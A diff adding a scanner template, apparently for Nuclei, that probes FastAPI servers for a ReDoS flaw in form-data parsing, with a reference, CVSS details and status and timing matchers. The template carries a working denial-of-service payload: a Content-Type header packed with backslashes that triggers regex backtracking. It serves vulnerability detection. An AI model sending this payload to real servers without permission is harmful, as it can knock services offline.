@@ -1,0 +1,29 @@
+id: fastapi-redos
+info:
+  name: Check FastAPI ReDoS Vulnerability in Form Data Parsing
+  author: DanMcInerney, byt3bl33d3r, nicecatch2000
+  severity: high
+  description: Checks for ReDoS vulnerability in FastAPI when parsing form data with a malicious Content-Type header.
+  reference:
+    - https://huntr.com/bounties/dd680268-d735-4f33-a358-d827694ab035
+  classification:
+    cvss-score: 7.5
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    cwe-id: CWE-400  # Resource Exhaustion
+  tags: fastapi, redos, dos, vulnerability, ai, ml, protectai, huntr
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/submit/"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'"
+    body: "input=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 502
+          - 504
+      - type: time
+        time: 5000  # Milliseconds, you may adjust this threshold based on expected response times
